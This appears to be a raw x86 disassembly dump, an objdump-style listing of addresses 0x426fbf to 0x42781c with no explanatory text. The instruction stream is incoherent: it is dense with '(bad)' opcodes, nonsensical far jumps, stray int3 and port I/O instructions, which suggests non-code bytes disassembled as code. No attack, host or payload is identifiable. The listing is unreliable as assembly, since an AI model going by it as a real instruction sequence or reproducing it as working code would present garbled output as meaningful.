  426fbf:	test   BYTE PTR [eax+0x270089ff],ah
  426fc5:	add    BYTE PTR [esi+0xff7c17],bl
  426fcb:	add    BYTE PTR [edi-0x6aae3801],dh
  426fd1:	inc    DWORD PTR [eax]
  426fd3:	jmp    ecx
  426fd5:	jmp    DWORD PTR [ecx-0x7c7c2133]
  426fdb:	call   FWORD PTR [edi]
  426fdd:	add    BYTE PTR [ebp-0x33ff19fa],dh
  426fe3:	inc    DWORD PTR [edx-0x1]
  426fe6:	dec    ebp
  426fe7:	test   DWORD PTR [ebx+eax*4-0x1],eax
  426feb:	(bad)  
  426fec:	std    
  426fed:	(bad)  
  426fee:	jg     0x426f9e
  426ff0:	pop    esp
  426ff1:	(bad)  
  426ff2:	(bad)  
  426ff3:	(bad)  
  426ff4:	cmp    bh,bh
  426ff6:	sti    
  426ff7:	mov    ebx,0xccff1f
  426ffc:	and    eax,0xa7fb75ff
  427001:	cmp    edi,0xffffffcc
  427004:	mov    edi,edi
  427006:	mov    ebx,0xff008498
  42700b:	add    BYTE PTR [ecx],bh
  42700d:	add    al,cl
  42700f:	pushf  
  427010:	repnz inc DWORD PTR [ebx+0x19ccd9ff]
  427017:	dec    ebp
  427018:	inc    edi
  427019:	int3   
  42701a:	add    DWORD PTR [ebx+0x1bf4ff00],0xffffffe3
  427021:	int3   
  427022:	add    BYTE PTR [ecx-0x6264ffc4],cl
  427028:	ret    
  427029:	add    BYTE PTR [ecx-0x3800dd00],cl
  42702f:	ficomp WORD PTR [eax-0x4b7c0034]
  427035:	add    BYTE PTR [esi],ah
  427037:	inc    edx
  427038:	repnz inc DWORD PTR [ebx+0x52ff97ff]
  42703f:	imul   eax,DWORD PTR [ecx+ecx*4+0xab89ff],0xedd01c
  42704a:	add    DWORD PTR [ebx-0x2d41ff8e],0x70
  427051:	add    bh,bh
  427053:	sub    DWORD PTR [ebx],0xffffffcc
  427056:	add    eax,0xff00d0f8
  42705b:	add    BYTE PTR [edx-0x7d],ah
  42705e:	or     bl,BYTE PTR [ebx+0x7]
  427061:	(bad)  
  427062:	(bad)  
  427063:	jmp    DWORD PTR [ebp-0x1]
  427066:	lods   eax,DWORD PTR ds:[esi]
  427067:	xchg   ebx,eax
  427068:	dec    ecx
  427069:	add    BYTE PTR [eax],al
  42706b:	add    BYTE PTR [ebx],bl
  42706d:	push   DWORD PTR [ebp-0x7c001a15]
  427073:	push   eax
  427075:	add    al,bh
  427077:	sub    BYTE PTR [ecx+0x72898300],ch
  42707d:	inc    DWORD PTR [ecx-0xff6395]
  427083:	push   DWORD PTR [eax-0x1]
  427086:	dec    DWORD PTR [ebp-0x7c0076b2]
  42708c:	xchg   ecx,eax
  42708d:	int3   
  42708e:	popf   
  42708f:	xor    ebx,0xffffffff
  427092:	mov    DWORD PTR [eax],eax
  427094:	ud0    edx,DWORD PTR [ecx+0x46]
  427098:	and    eax,0x4d00ff89
  42709d:	jmp    DWORD PTR [ecx]
  42709f:	into   
  4270a0:	retf   
  4270a1:	int3   
  4270a2:	cmp    edi,0xffffffa8
  4270a5:	call   DWORD PTR [esi+0x3d]
  4270a8:	ins    BYTE PTR es:[edi],dx
  4270a9:	mov    edi,edi
  4270ab:	jmp    FWORD PTR [eax-0x34656100]
  4270b1:	int3   
  4270b2:	(bad)  
  4270b3:	push   DWORD PTR [edx-0x720f9e01]
  4270b9:	mov    edi,edi
  4270bb:	call   DWORD PTR [ebx]
  4270bd:	dec    DWORD PTR [edi+ebx*4+0x14]
  4270c1:	add    BYTE PTR [eax],al
  4270c3:	mov    esp,esi
  4270c5:	dec    DWORD PTR [ecx+0x34]
  4270c8:	rol    DWORD PTR [ebx-0x90ff34],0x4c
  4270cf:	jne    0x4270fc
  4270d1:	or     DWORD PTR [ecx+0x37001dff],0x1c
  4270d8:	(bad)  
  4270da:	(bad)  
  4270db:	push   DWORD PTR [eax]
  4270dd:	add    BYTE PTR [esi-0x3300ff96],dl
  4270e3:	push   DWORD PTR [edx-0x34]
  4270e6:	repnz pop edi
  4270e8:	push   ss
  4270e9:	dec    esp
  4270eb:	add    dl,bl
  4270ed:	add    ch,dh
  4270ef:	clc    
  4270f0:	cmp    edi,0xffc700ff
  4270f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270f7:	loope  0x42709b
  4270f9:	(bad)  
  4270fa:	(bad)  
  4270fb:	inc    DWORD PTR [eax+eax*1]
  4270fe:	or     eax,0xffffe41c
  427103:	sub    DWORD PTR [edi-0x1],0x65
  427107:	in     eax,0x17
  427109:	add    BYTE PTR [eax],al
  42710b:	add    BYTE PTR [eax-0x1],cl
  42710e:	das    
  42710f:	sub    esi,DWORD PTR [esi+0x0]
  427112:	(bad)  
  427113:	inc    DWORD PTR ds:0xd98ee700
  427119:	add    BYTE PTR [ebx+0x4dffd1cc],al
  42711f:	jge    0x42718d
  427121:	add    BYTE PTR [eax],al
  427123:	int3   
  427124:	scas   eax,DWORD PTR es:[edi]
  427125:	add    BYTE PTR [ecx],cl
  427127:	mov    eax,?
  427129:	add    bh,bh
  42712b:	jmp    DWORD PTR [edi+edi*8]
  42712e:	add    eax,0x83ffd9ee
  427133:	jmp    esp
  427135:	dec    DWORD PTR [eax-0x71]
  427138:	inc    edi
  427139:	(bad)  
  42713a:	(bad)  
  42713b:	inc    DWORD PTR [eax]
  42713d:	cmp    DWORD PTR [edx],0xffffffff
  427140:	fs cmp edi,0xffffffff
  427144:	ret    0x78cc
  427147:	retf   0xff94
  42714a:	inc    DWORD PTR [eax]
  42714c:	dec    esp
  42714d:	add    BYTE PTR [eax+eiz*2],dl
  427150:	add    DWORD PTR [ebx+0x3dffcc],0x2d
  427157:	inc    esi
  427158:	xor    eax,DWORD PTR [eax]
  42715a:	int3   
  42715b:	(bad)  
  42715c:	cmp    edi,edi
  42715e:	xchg   esi,eax
  42715f:	push   edx
  427160:	xchg   ebx,eax
  427161:	inc    DWORD PTR [eax]
  427163:	add    BYTE PTR [ebx],dl
  427165:	adc    DWORD PTR [edi-0xffddd4],0xffffffff
  42716c:	pop    edx
  42716d:	jmp    DWORD PTR [esi+0x17]
  427170:	add    BYTE PTR [eax],al
  427172:	int3   
  427173:	add    BYTE PTR [eax+0x319cacc],bh
  427179:	add    BYTE PTR [ebx+0x71008ccc],al
  42717f:	jnp    0x427172
  427181:	int3   
  427182:	mov    edi,edi
  427184:	rol    DWORD PTR [eax],1
  427186:	or     BYTE PTR [edi-0x3a],bh
  427189:	add    ah,cl
  42718b:	call   FWORD PTR [esi+0x20829dff]
  427191:	inc    DWORD PTR [eax]
  427193:	and    DWORD PTR [edx],0xffffff83
  427196:	pop    esp
  427197:	inc    esi
  427198:	out    dx,eax
  427199:	add    bh,bh
  42719b:	cmp    ebx,0xffffffff
  42719e:	adc    al,0xc5
  4271a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271a1:	add    bh,bh
  4271a3:	(bad)  
  4271a4:	std    
  4271a5:	(bad)  
  4271a6:	std    
  4271a7:	and    BYTE PTR [edi+edi*8-0x33680100],dh
  4271ae:	inc    edx
  4271af:	adc    al,0x5e
  4271b1:	inc    DWORD PTR [ebx-0x17762c01]
  4271b7:	aaa    
  4271b8:	aaa    
  4271b9:	cmp    edi,0xffffffff
  4271bc:	mov    eax,ds:0x76833300
  4271c1:	(bad)  
  4271c2:	inc    DWORD PTR [ebx+0xb23ff68]
  4271c8:	out    dx,al
  4271c9:	inc    DWORD PTR [ebx-0x5d7c1c01]
  4271cf:	xor    DWORD PTR [edi+0x11ff00ff],ebx
  4271d5:	call   DWORD PTR [ebp-0x79]
  4271d8:	xor    bh,bh
  4271da:	add    BYTE PTR [eax],al
  4271dc:	mov    esi,0x101cf1ff
  4271e1:	add    bh,bh
  4271e3:	add    BYTE PTR [ebp-0x7f98cd00],al
  4271e9:	inc    DWORD PTR [eax]
  4271eb:	add    BYTE PTR [ebp-0x34],cl
  4271ee:	jle    0x42724a
  4271f0:	or     al,0xff
  4271f2:	add    bh,bh
  4271f4:	bswap  esp
  4271f6:	retf   0x30a4
  4271f9:	inc    DWORD PTR [eax]
  4271fb:	push   DWORD PTR [ebx+0x0]
  4271fe:	xchg   ecx,eax
  4271ff:	jg     0x427276
  427201:	add    DWORD PTR [ebx-0x227cf400],0x46
  427208:	jnp    0x427209
  42720a:	cmp    edi,0x26
  42720d:	int3   
  42720e:	(bad)  
  42720f:	call   0xe4:0xffccffb4
  427216:	sbb    eax,0xffccb0e6
  42721b:	int3   
  42721c:	mov    ah,0xff
  42721e:	fadd   DWORD PTR ds:0x89ff0027
  427224:	push   eax
  427225:	jmp    FWORD PTR [eax+esi*2]
  427228:	repnz (bad) 
  42722a:	dec    esp
  42722c:	push   0xffffff83
  42722e:	push   0xfffffff0
  427230:	and    ecx,DWORD PTR [ecx-0xb30001]
  427236:	and    dh,BYTE PTR [ebx]
  427238:	inc    esp
  427239:	add    BYTE PTR [eax],al
  42723b:	add    BYTE PTR [edi-0x5a510f00],ah
  427241:	mov    edi,edi
  427243:	dec    DWORD PTR [ecx+0x0]
  427246:	fidiv  DWORD PTR ds:0xffff89d9
  42724c:	lahf   
  42724d:	and    DWORD PTR [esi+0xff4c7c],0xffffff83
  427254:	ret    
  427255:	int3   
  427256:	retf   
  427257:	sbb    eax,0xcc00ff00
  42725c:	dec    esi
  42725d:	add    BYTE PTR [edx],ah
  42725f:	out    dx,eax
  427260:	add    eax,0x2d0000cc
  427265:	add    BYTE PTR [ecx+0xff0c55],bl
  42726b:	call   FWORD PTR [edx]
  42726d:	add    BYTE PTR [ebp-0x33ff9b16],al
  427273:	add    BYTE PTR [edx-0x1052e900],bl
  427279:	add    bh,bh
  42727b:	dec    ebx
  42727d:	(bad)  
  42727e:	stc    
  42727f:	mov    ds:0xff00cb,al
  427284:	sub    bh,bh
  427286:	jae    0x4272de
  427288:	in     eax,0xff
  42728a:	mov    edi,edi
  42728c:	jns    0x427211
  42728e:	popf   
  42728f:	inc    eax
  427290:	mov    cl,0x0
  427292:	add    bh,bh
  427294:	inc    ecx
  427295:	adc    esp,0x52
  427298:	inc    DWORD PTR ds:[eax]
  42729b:	mov    DWORD PTR [ebp-0x77],ecx
  42729e:	gs daa 
  4272a0:	repz add BYTE PTR [ebx-0x6100ae01],al
  4272a7:	sub    al,BYTE PTR [edi-0x5c7c3400]
  4272ad:	add    bh,ah
  4272af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272b0:	mov    ?,edi
  4272b2:	inc    DWORD PTR [eax]
  4272b4:	test   DWORD PTR [eax],0xff11b90d
  4272ba:	dec    esp
  4272bc:	add    eax,0x139362ff
  4272c1:	int3   
  4272c2:	add    bh,bh
  4272c4:	push   edx
  4272c5:	add    DWORD PTR [ecx-0x50],0xffffffc8
  4272c9:	add    BYTE PTR [ebx-0x24ff4e00],al
  4272cf:	stos   DWORD PTR es:[edi],eax
  4272d0:	jmp    0x9541f5d5
  4272d5:	add    BYTE PTR [esi+0x1f],al
  4272d8:	lods   al,BYTE PTR ds:[esi]
  4272d9:	add    BYTE PTR [eax],al
  4272db:	inc    DWORD PTR ds:0x89b85783
  4272e1:	(bad)  
  4272e2:	inc    DWORD PTR [ebx+0x7642ff7d]
  4272e8:	out    0xff,al
  4272ea:	inc    DWORD PTR [ebx-0xc2a0042]
  4272f0:	fdivp  st(7),st
  4272f2:	add    BYTE PTR [eax],al
  4272f4:	test   esp,0xc2037f
  4272fa:	inc    DWORD PTR [eax]
  4272fc:	bound  eax,QWORD PTR [eax]
  4272fe:	fadd   DWORD PTR [ebx-0x33ff00c8]
  427304:	jns    0x427306
  427306:	pop    esi
  427307:	pop    ebp
  427308:	js     0x427309
  42730a:	inc    DWORD PTR [ebx+0x5b22cc88]
  427310:	dec    eax
  427311:	inc    DWORD PTR [ebx-0x7100f27d]
  427317:	int    0xd2
  427319:	(bad)  
  42731a:	dec    esp
  42731c:	xchg   ebx,eax
  42731d:	int3   
  42731e:	pop    ecx
  42731f:	inc    edx
  427320:	sahf   
  427321:	add    BYTE PTR [eax],al
  427323:	add    BYTE PTR [esi-0x7d],ch
  427326:	ret    
  427327:	nop
  427328:	jle    0x427329
  42732a:	add    bh,bh
  42732c:	sbb    DWORD PTR [eax],eax
  42732e:	xor    al,0xb4
  427330:	add    eax,DWORD PTR [eax]
  427332:	cmp    edi,0xffffffd9
  427335:	or     DWORD PTR [esi+esi*1],0xffffffab
  427339:	inc    DWORD PTR [eax]
  42733b:	sbb    DWORD PTR [eax+eax*1-0x88831a],0xffffffff
  427343:	add    edx,0xffffffcc
  427346:	addr16 addr16 and eax,0xf7ffffcc
  42734d:	add    BYTE PTR [eax+edi*1+0x39],al
  427351:	add    bh,bh
  427353:	jmp    DWORD PTR [esi]
  427355:	int3   
  427356:	paddd  mm3,mm5
  427359:	inc    DWORD PTR [eax]
  42735b:	(bad)  
  42735c:	(bad)  
  42735e:	xor    ebx,esi
  427360:	(bad)  
  427362:	(bad)  
  427363:	call   edi
  427365:	cmp    eax,0xffffffa3
  427368:	jmp    0x427369
  42736a:	dec    esp
  42736c:	or     edi,edi
  42736e:	mov    ds:0x8300d250,eax
  427373:	add    edx,0xffffff83
  427376:	outs   dx,DWORD PTR ds:[esi]
  427377:	lods   al,BYTE PTR ds:[esi]
  427378:	nop
  427379:	add    DWORD PTR [eax],0xffffffcc
  42737c:	int    0xcc
  42737e:	cmp    dh,ah
  427380:	(bad)  
  427383:	call   DWORD PTR ds:0x714c3c00
  427389:	inc    DWORD PTR [eax]
  42738b:	(bad)  
  42738c:	jl     0x427311
  42738e:	cmp    ah,al
  427390:	out    dx,al
  427391:	(bad)  
  427392:	(bad)  
  427393:	(bad)  
  427394:	jns    0x427395
  427396:	(bad)  
  427397:	je     0x427346
  427399:	mov    DWORD PTR [ebx-0x13763701],eax
  42739f:	sar    dl,0xff
  4273a2:	add    BYTE PTR [ebx+0x1384ffcc],al
  4273a8:	sub    bh,bh
  4273aa:	(bad)  
  4273ab:	push   DWORD PTR [edi-0x1]
  4273ae:	shl    BYTE PTR [esp+edi*8+0x0],cl
  4273b2:	(bad)  
  4273b3:	jmp    FWORD PTR [ebp+0x56dc3e00]
  4273b9:	add    BYTE PTR [eax],al
  4273bb:	int3   
  4273bc:	fdiv   st(7),st
  4273be:	push   eax
  4273bf:	pushf  
  4273c0:	mov    edx,0x79ffffcc
  4273c5:	sub    edi,0x7d
  4273c8:	test   edi,edi
  4273ca:	cmp    edi,0x69
  4273cd:	call   FWORD PTR [edx]
  4273cf:	push   cs
  4273d0:	aas    
  4273d1:	inc    DWORD PTR [ebx-0x26007400]
  4273d7:	and    DWORD PTR [ebx+0x52ccff83],0xffffffff
  4273de:	pop    edx
  4273df:	sbb    DWORD PTR [ecx+0x67ffff00],edx
  4273e5:	call   DWORD PTR [ebx]
  4273e7:	and    DWORD PTR [esi-0x7d],ecx
  4273ea:	(bad)  
  4273eb:	dec    esi
  4273ed:	jmp    FWORD PTR [ebx-0xb162]
  4273f3:	cmp    DWORD PTR [edx],0xffffffff
  4273f6:	popa   
  4273f7:	sbb    al,0x1d
  4273f9:	add    bh,bh
  4273fb:	sub    DWORD PTR [edi+0x0],0xffffffa8
  4273ff:	sbb    eax,0x89890000
  427404:	or     bh,bh
  427406:	jns    0x4273f0
  427408:	jno    0x427409
  42740a:	or     DWORD PTR [ecx-0x21d600b4],0x74
  427411:	(bad)  
  427412:	inc    DWORD PTR [eax]
  427414:	ret    
  427415:	add    BYTE PTR [eax],dl
  427417:	sbb    al,0x29
  427419:	dec    DWORD PTR [ecx+0x2789baff]
  42741f:	push   esp
  427420:	xchg   esp,eax
  427421:	dec    esp
  427423:	add    BYTE PTR [esi],dh
  427425:	add    BYTE PTR [ecx+eax*4+0xec],dh
  42742c:	int3   
  42742d:	add    BYTE PTR [edi-0x39],bh
  427430:	scas   eax,DWORD PTR es:[edi]
  427431:	inc    DWORD PTR [ebx+0x45003400]
  427437:	cwde   
  427438:	in     al,dx
  427439:	add    bh,bh
  42743b:	push   DWORD PTR [edi]
  42743d:	jmp    DWORD PTR [ebx]
  42743f:	push   DWORD PTR [eax-0x1]
  427442:	add    bh,bh
  427444:	or     esp,0x78
  427447:	int3   
  427448:	inc    eax
  427449:	inc    DWORD PTR [eax]
  42744b:	jmp    FWORD PTR [ebx+0x6e49c6ff]
  427451:	add    bh,bh
  427453:	jmp    DWORD PTR [edx-0x3be0e100]
  427459:	mov    DWORD PTR [ebx+0x3700cf00],eax
  42745f:	xchg   ebx,eax
  427460:	adc    edi,edi
  427462:	add    BYTE PTR [ecx-0x17a0063],cl
  427468:	jo     0x42746a
  42746a:	add    DWORD PTR [eax],0x45
  42746d:	add    bh,bh
  42746f:	sar    BYTE PTR [ebp-0x1],1
  427472:	add    BYTE PTR [eax],al
  427474:	cmp    edi,edi
  427476:	cmp    bh,cl
  427478:	aas    
  427479:	inc    DWORD PTR [eax]
  42747b:	mov    DWORD PTR [edx],ebx
  42747d:	int3   
  42747e:	data16 int 0x8
  427481:	add    BYTE PTR [eax],al
  427483:	mov    DWORD PTR [edx-0x139ee201],edx
  427489:	inc    DWORD PTR [eax]
  42748b:	inc    DWORD PTR [ebx+0x0]
  42748e:	rol    BYTE PTR [edi],0xd5
  427491:	add    bh,bh
  427493:	add    ah,cl
  427495:	inc    DWORD PTR [eax-0x53]
  427498:	jb     0x427466
  42749a:	mov    edi,edi
  42749c:	mov    al,ds:0x20aa4383
  4274a1:	int3   
  4274a2:	add    DWORD PTR [eax],0xffffffe5
  4274a5:	(bad)  
  4274a6:	jg     0x42748c
  4274a8:	pop    es
  4274a9:	int3   
  4274aa:	add    BYTE PTR [eax],al
  4274ac:	ret    
  4274ad:	add    BYTE PTR [ebx],dl
  4274af:	loop   0x427474
  4274b1:	cmp    edi,0x0
  4274b4:	cmp    edi,edi
  4274b6:	(bad)  
  4274b8:	jns    0x4274ba
  4274ba:	int3   
  4274bb:	push   DWORD PTR [esi+0x0]
  4274be:	cmp    dh,BYTE PTR [esi-0x62]
  4274c1:	mov    edi,edi
  4274c3:	add    ch,bl
  4274c5:	int3   
  4274c6:	int3   
  4274c7:	xor    esp,DWORD PTR [eax-0x6f763400]
  4274cd:	sbb    DWORD PTR [edx-0x5d],0xffffffdf
  4274d1:	cmp    edi,0xffffff83
  4274d4:	sub    eax,0x53e2e00
  4274d9:	(bad)  
  4274da:	inc    DWORD PTR [eax]
  4274dc:	(bad)  
  4274de:	xchg   ebp,eax
  4274df:	cmp    al,0x18
  4274e1:	add    BYTE PTR [eax],al
  4274e3:	int3   
  4274e4:	repz (bad) 
  4274e6:	js     0x427550
  4274e8:	(bad)  
  4274e9:	dec    DWORD PTR [ecx+0x32ff6289]
  4274ef:	pop    edx
  4274f0:	xchg   edx,eax
  4274f1:	int3   
  4274f2:	int3   
  4274f3:	add    BYTE PTR [ebx+eax*4+0xab4f25],bh
  4274fa:	cmp    edi,0xffffffef
  4274fd:	jmp    FWORD PTR [ecx+0x76]
  427500:	mov    ecx,0xd7ccff00
  427505:	add    BYTE PTR [eax+ebp*2-0xffff61],al
  42750c:	jbe    0x427491
  42750e:	lahf   
  42750f:	mov    edx,0x89001200
  427514:	sub    edi,edi
  427516:	or     esp,0x5
  427519:	add    BYTE PTR [ebx],bl
  42751b:	cdq    
  42751c:	(bad)  
  42751d:	fnstcw WORD PTR [eax]
  42751f:	rol    DWORD PTR [eax],1
  427521:	(bad)  
  427522:	inc    DWORD PTR [ebx-0xff7623]
  427528:	fld    QWORD PTR [eax]
  42752a:	push   ecx
  42752b:	mov    esp,0x1a04c7ff
  427530:	add    bl,al
  427532:	inc    DWORD PTR [eax]
  427534:	ja     0x427536
  427536:	cmp    edi,0xfffffffb
  427539:	inc    DWORD PTR [edx+0x195dccc4]
  42753f:	into   
  427540:	add    BYTE PTR [eax+eax*1-0xff2534],dl
  427547:	call   DWORD PTR [eax+0xc68c00]
  42754d:	pusha  
  42754e:	or     dh,BYTE PTR [ecx]
  427550:	dec    DWORD PTR [esi+0x0]
  427553:	int3   
  427554:	sub    edi,edi
  427556:	add    BYTE PTR [eax],al
  427558:	push   edi
  427559:	inc    esp
  42755b:	pop    ds
  42755c:	call   FWORD PTR [eax+esi*1+0x53]
  427560:	add    bh,dh
  427562:	add    bh,bh
  427564:	or     ah,cl
  427566:	add    bh,bh
  427568:	add    bh,bh
  42756a:	pop    ecx
  42756b:	icebp  
  42756c:	add    BYTE PTR [ecx],cl
  42756e:	pusha  
  42756f:	jnp    0x427570
  427571:	xchg   ebp,eax
  427572:	(bad)  
  427573:	jmp    FWORD PTR [ecx-0x74340000]
  427579:	cmp    edx,0x52
  42757c:	dec    DWORD PTR [ebx]
  42757e:	sahf   
  42757f:	sbb    eax,DWORD PTR [eax]
  427581:	js     0x42750c
  427583:	add    bl,bl
  427585:	inc    DWORD PTR [eax]
  427587:	dec    DWORD PTR [ebp-0x1]
  42758a:	(bad)  
  42758b:	scas   eax,DWORD PTR es:[edi]
  42758c:	mov    edi,esp
  42758e:	ja     0x4275a1
  427590:	mov    DWORD PTR [edx+0x0],ecx
  427593:	add    BYTE PTR [eax],al
  427595:	add    BYTE PTR [eax],al
  427597:	dec    DWORD PTR [ebp+0xfa41ff]
  42759d:	cmp    BYTE PTR [esi-0x850000],0xff
  4275a4:	pop    esp
  4275a5:	add    BYTE PTR [ebx-0x37ff637d],al
  4275ab:	repz add cl,bl
  4275ae:	ja     0x4275cd
  4275b0:	jmp    DWORD PTR [ecx+0x0]
  4275b3:	call   FWORD PTR [ebx-0x4f7cff01]
  4275b9:	dec    edx
  4275bb:	jae    0x4275bc
  4275bd:	inc    edi
  4275be:	pusha  
  4275bf:	test   DWORD PTR [eax],0x6eff0041
  4275c5:	add    bh,bh
  4275c7:	cmp    DWORD PTR [ecx],0xffffffff
  4275ca:	and    al,0x3
  4275cc:	add    bl,bl
  4275ce:	mov    cl,0x6f
  4275d0:	add    BYTE PTR [ebx+0x0],dh
  4275d3:	xor    DWORD PTR [edi+edi*8-0x7ca10000],0xffffffd9
  4275db:	dec    edx
  4275dc:	(bad)  
  4275dd:	jmp    0x3d41ebba
  4275e2:	mov    esp,ecx
  4275e4:	or     edi,edi
  4275e6:	add    DWORD PTR [ebx+0x5d5900b3],0xffffffff
  4275ed:	push   cs
  4275ee:	cwde   
  4275ef:	aam    0xff
  4275f1:	add    edi,edi
  4275f3:	add    BYTE PTR [ebp-0x1],ah
  4275f6:	add    bh,bh
  4275f8:	xchg   ebp,eax
  4275f9:	jmp    DWORD PTR [edx+ecx*2-0x1]
  4275fd:	cli    
  4275fe:	out    dx,al
  4275ff:	idiv   edi
  427601:	push   eax
  427602:	cmp    edi,0x54
  427605:	(bad)  
  427606:	(bad)  
  427607:	(bad)  
  427608:	jmp    0xe8b5:0xffe70883
  42760f:	jle    0x427610
  427611:	sub    cl,ah
  427613:	dec    DWORD PTR [eax]
  427615:	inc    DWORD PTR [ebx-0x79ff2500]
  42761b:	test   DWORD PTR [eax],0x8977c449
  427621:	mov    al,BYTE PTR [ebx-0x6401]
  427627:	(bad)  
  427628:	fld    QWORD PTR [eax]
  42762a:	xchg   edi,eax
  42762b:	ret    0x4eff
  42762e:	mov    ecx,0xff640047
  427633:	(bad)  
  427634:	out    dx,al
  427635:	add    BYTE PTR [ebx+0x7cffd100],al
  42763b:	mov    ds:0x1bffd9ff,eax
  427640:	add    BYTE PTR [eax-0x1],ah
  427643:	add    BYTE PTR [ebx+0x0],cl
  427646:	add    DWORD PTR [eax],0x61
  427649:	add    al,bh
  42764b:	daa    
  42764c:	add    al,al
  42764e:	push   edx
  42764f:	add    BYTE PTR gs:[edi+edi*8-0x76ad01],ah
  427657:	add    BYTE PTR [edi],al
  427659:	add    BYTE PTR ds:0x4803ff5a,cl
  42765f:	and    al,0x89
  427661:	ret    0xff00
  427664:	(bad)  
  427665:	(bad)  
  427666:	(bad)  
  427667:	jmp    FWORD PTR [ebx-0x7c169b7d]
  42766d:	ins    DWORD PTR es:[edi],dx
  42766e:	jp     0x4276cf
  427670:	call   FWORD PTR [ebx]
  427672:	cmp    edi,0xffffffc1
  427675:	inc    DWORD PTR [eax]
  427677:	add    DWORD PTR [eax+eax*1-0x30ff1442],0x2f
  42767f:	enter  0x6f83,0x0
  427683:	(bad)  
  427684:	clc    
  427685:	add    bh,bh
  427687:	push   DWORD PTR [ecx]
  427689:	add    dl,dl
  42768b:	or     edi,edi
  42768d:	jp     0x427673
  42768f:	aam    0x0
  427691:	jnp    0x427616
  427693:	(bad)  
  427694:	mov    ebp,0xd000ff00
  427699:	call   eax
  42769b:	sub    edi,edi
  42769d:	test   DWORD PTR [ecx-0x59],edx
  4276a0:	add    BYTE PTR [ebx+0xc00083],dl
  4276a6:	mov    edi,edi
  4276a8:	pop    ebp
  4276a9:	mov    esp,esp
  4276ab:	aaa    
  4276ac:	add    BYTE PTR [edx],cl
  4276ae:	loopne 0x4276ec
  4276b0:	mov    DWORD PTR ds:0xff470083,edx
  4276b6:	int3   
  4276b7:	add    BYTE PTR [edx],ah
  4276b9:	call   FWORD PTR [edx]
  4276bb:	fdivp  st(7),st
  4276bd:	mov    ecx,0xa8001400
  4276c2:	add    bh,bh
  4276c4:	lods   al,BYTE PTR ds:[esi]
  4276c5:	dec    esp
  4276c7:	inc    esp
  4276c9:	call   esi
  4276cb:	push   eax
  4276cc:	inc    eax
  4276ce:	lea    ebx,[ebx-0x7600087d]
  4276d4:	push   ss
  4276d5:	add    BYTE PTR [ebx+0x1f0097ff],al
  4276db:	repz adc DWORD PTR [ebp-0x3c002a7d],0xffffffff
  4276e3:	inc    DWORD PTR [ebx+eax*4]
  4276e6:	(bad)  
  4276e7:	dec    DWORD PTR [eax-0x814677]
  4276ed:	lods   eax,DWORD PTR ds:[esi]
  4276ee:	ss mov edi,?
  4276f1:	out    dx,eax
  4276f2:	(bad)  
  4276f3:	push   esp
  4276f5:	inc    DWORD PTR [eax]
  4276f7:	add    bl,ah
  4276f9:	jmp    DWORD PTR [edx]
  4276fb:	fdiv   st(7),st
  4276fd:	xor    bl,BYTE PTR [ecx-0x76a200cd]
  427703:	call   FWORD PTR [edi]
  427705:	inc    DWORD PTR [eax]
  427707:	jmp    eax
  427709:	add    BYTE PTR [ecx+0x45fc89b4],bl
  42770f:	fdiv   st(7),st
  427711:	stos   BYTE PTR es:[edi],al
  427712:	inc    DWORD PTR [eax]
  427714:	mov    DWORD PTR [ebx-0x3b7c01],0x72832d43
  42771e:	fcomi  st,st(6)
  427720:	push   DWORD PTR [ebx+eax*4]
  427723:	call   DWORD PTR [ecx-0x1]
  427726:	add    BYTE PTR [ebx-0x3ca23324],al
  42772c:	call   FWORD PTR [ebp+0x19835b7a]
  427732:	add    DWORD PTR [eax],0x2
  427735:	add    BYTE PTR [eax],al
  427737:	xor    ebp,0xffffffff
  42773a:	aam    0x32
  42773c:	call   DWORD PTR [ebx]
  42773e:	cld    
  42773f:	xchg   ecx,eax
  427740:	add    BYTE PTR [edx],cl
  427742:	inc    DWORD PTR [eax]
  427744:	mov    edi,0xe983ff00
  427749:	int3   
  42774a:	and    dl,ch
  42774c:	jmp    FWORD PTR [edx]
  42774e:	mov    ds:0xff78ffcf,al
  427753:	add    BYTE PTR [eax-0x4600ff01],al
  427759:	add    BYTE PTR [ebx+0x19298391],bl
  42775f:	lock inc eax
  427762:	int3   
  427763:	add    BYTE PTR [edi],cl
  427765:	inc    DWORD PTR [eax]
  427767:	add    BYTE PTR [edi+edi*8-0x66ffc114],al
  42776e:	sbb    ch,BYTE PTR [edi-0x1]
  427771:	pop    ebp
  427772:	cmp    edi,0x41
  427775:	inc    DWORD PTR [ebx+0x2cff2f00]
  42777b:	xchg   ecx,eax
  42777c:	(bad)  
  42777d:	(bad)  
  42777e:	mov    edi,0xff20ffa5
  427783:	sub    eax,0xffffffff
  427786:	dec    DWORD PTR [ecx+0x638fffb0]
  42778c:	sbb    DWORD PTR [ebp-0x6f],0x32
  427790:	int3   
  427791:	dec    eax
  427792:	mov    edi,edi
  427794:	jg     0x427795
  427796:	(bad)  
  427797:	(bad)  
  427798:	mov    esp,0xff2ef3ff
  42779d:	mov    ebx,0x19fff87c
  4277a2:	dec    DWORD PTR [ecx-0x7cffa2]
  4277a8:	add    al,0x0
  4277aa:	mov    esi,0xf166007a
  4277af:	push   ecx
  4277b0:	call   DWORD PTR ds:0xff5400ff
  4277b6:	(bad)  
  4277b7:	jmp    DWORD PTR [eax+eax*1+0x57009ad0]
  4277be:	sub    eax,0xd6ff7e
  4277c3:	call   FWORD PTR [ebx]
  4277c5:	inc    DWORD PTR [ebx+0x200b383]
  4277cb:	popf   
  4277cc:	jmp    FWORD PTR [ebx-0x5d7cd9d8]
  4277d2:	mov    edi,edi
  4277d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277d5:	add    BYTE PTR [eax],al
  4277d7:	and    DWORD PTR [edi+edi*8],0x8
  4277db:	cdq    
  4277dc:	add    BYTE PTR [esi-0x603383c3],dl
  4277e2:	int3   
  4277e3:	add    BYTE PTR [esi-0x34],dh
  4277e6:	(bad)  
  4277e7:	dec    ebx
  4277e9:	inc    DWORD PTR [esi-0x303dff44]
  4277ef:	mov    eax,ds:0xbdff
  4277f4:	imul   eax,DWORD PTR [ebx+0xc6ff00],0x91ccc157
  4277fe:	push   0x4f
  427800:	adc    ecx,0xffffffff
  427803:	int3   
  427804:	int3   
  427805:	(bad)  
  427806:	inc    DWORD PTR [ebx+0x11110052]
  42780c:	int3   
  42780d:	sti    
  42780e:	sbb    esi,ebx
  427810:	add    BYTE PTR [ebx-0x33c97c34],ah
  427816:	inc    DWORD PTR [ebx+0x11e200df]
  42781c:	add    bh,dh
